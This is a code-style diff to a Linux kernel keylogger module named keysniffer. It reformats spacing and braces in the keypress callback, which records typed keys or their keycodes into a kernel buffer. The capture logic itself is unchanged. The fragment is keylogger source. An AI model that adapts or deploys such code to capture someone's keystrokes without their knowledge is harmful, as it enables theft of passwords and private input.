@@ -27,7 +27,7 @@
 
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 
-static int codes=0;
+static int codes;
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
@@ -117,7 +117,8 @@ static struct notifier_block keysniffer_blk = {
  *  - rep   : string buffer to place the representation in
  *  - size  : the max size of the buffer
  */
-void to_base_n_string(int input, int n,char *rep,int size){
+void to_base_n_string(int input, int n, char *rep, int size)
+{
 	int i;
 	int start;
 	int remainders[size];
@@ -133,17 +134,17 @@ void to_base_n_string(int input, int n,char *rep,int size){
 
 	i = size - 1;
 
-	while ( div > 0 ) {
+	while (div > 0) {
 		remainders[i] = div % n;
 		div = div / n;
 		i--;
 	}
 
-	start = i+1;
+	start = i + 1;
 
-	for (i = start; i < size; i++) {
+	for (i = start; i < size; i++)
 		rep[i - start] = '0' + remainders[i];
-	}
+
 }
 
 /* Keypress callback */
@@ -169,34 +170,34 @@ int keysniffer_cb(struct notifier_block *nblock,
 			: us_keymap[param->value][0];
 		if (pressed_key) {
 			int pklen, replen;
-			if ( codes ) {
-				to_base_n_string(param->value,10,key,sizeof(int)+1);
-				to_base_n_string(param->shift,10,rep,sizeof(int)+1);
+
+			if (codes) {
+				to_base_n_string(param->value, 10, key, sizeof(int) + 1);
+				to_base_n_string(param->shift, 10, rep, sizeof(int) + 1);
 				pressed_key = key;
 				pklen = strlen(pressed_key);
 				replen = strlen(rep);
 
 				len = pklen + replen + 1;
-			} else {
+			} else
 				len = strlen(pressed_key);
-			}
+
 
 			if ((buf_pos + len) >= BUF_LEN) {
 				memset(keys_buf, 0, BUF_LEN);
 				buf_pos = 0;
 			}
 
-			if( codes ) {
+			if (codes) {
 				strncpy(keys_buf + buf_pos, rep, replen);
 				buf_pos += replen;
 				strncpy(keys_buf + buf_pos, " ", 1);
 				buf_pos++;
-				strncpy(keys_buf + buf_pos, pressed_key,
-					pklen);
+				strncpy(keys_buf + buf_pos, pressed_key, pklen);
 				buf_pos += pklen;
 
 			} else {
-				strncpy(keys_buf + buf_pos, pressed_key,len);
+				strncpy(keys_buf + buf_pos, pressed_key, len);
 				buf_pos += len;
 			}
 
